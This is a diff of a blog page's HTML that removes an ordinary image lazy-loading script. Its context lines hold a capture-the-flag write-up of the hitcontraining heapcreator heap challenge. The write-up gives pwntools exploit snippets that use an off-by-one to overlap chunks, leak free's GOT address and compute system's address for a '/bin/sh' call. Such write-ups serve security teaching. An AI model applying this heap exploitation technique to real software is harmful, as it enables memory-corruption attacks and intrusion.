@@ -144,7 +144,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -262,7 +262,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -336,27 +336,27 @@
 </li>
 </ul>
 <p><font size="4"><strong>很明显的堆菜单题目</strong></font></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>menu</strong></font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>create_heap</strong></font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>delete_heap</strong></font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>edit_heap</strong></font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>show_heap</strong></font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p>
 <h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><font color="red">分析：</font></h3><ul>
 <li>各个功能块都展示完了，发现在edit_heap有一个**<font color="red">off_by_one漏洞，那么我们可以修改下一个chunk的size**</font></li>
 <li>将其free掉,再add回来，就可以修改chunk的内容，注意到show_heap是一个**%s + 地址**，那么我们将其填入free_got，就可以得到free的真实地址，从而泄露libc，获得system，但是光system不够啊。</li>
@@ -366,11 +366,11 @@
 <h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a><font color="red">gdb调试</font></h3><p><font size="4" color="red">1.申请三次chunk</font></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line">bug()</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p>
 <ul>
 <li>调用了三次create_heap,有6个chunk,看看其内容是什么</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p>
 <p>可以猜测，相比于正常的chunk结构，这里前面多了一个chunk的结构体，记录了其size和user_data_address</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span>* heaparray[i] <span class="comment">// 大概意思 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
@@ -379,18 +379,18 @@
 <p><font size="4" color="red"><strong>2.利用off_by_one修改size</strong></font></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p>
 <ul>
 <li>从箭头处,也就是data处填入数据，往heaparray[0]处地址写入&#x2F;bin&#x2F;sh，修改chunk1结构体size,<strong>使得下方0x70的内容被合并为一个chunk</strong>，之后的free和malloc都会被当成一个chunk处理</li>
 </ul>
 <p><font size="4" color="red"><strong>3.add修改show部分的地址为free_got，泄露libc</strong></font></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"> 此时<span class="number">1</span>,<span class="number">2</span>合并，修改<span class="number">2</span>号chunk_data为free_got，show出来泄漏真实地址</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got) <span class="comment">#0x8记录的是chunk2的size，也是后面edit的长度，0x8,0x10都可以</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p>
 <ul>
 <li>对于chunk2,也就是heaparray[2]来说，它的内容已经更改，show的时候就是show(0x602018)，也就是将free_got指向的内容给输出出来，也就是输出free的真实地址</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p>
 <ul>
 <li>此时的heaparray内容如上，因此show可以将free真实地址show出来</li>
 </ul>
@@ -701,7 +701,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -828,18 +828,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
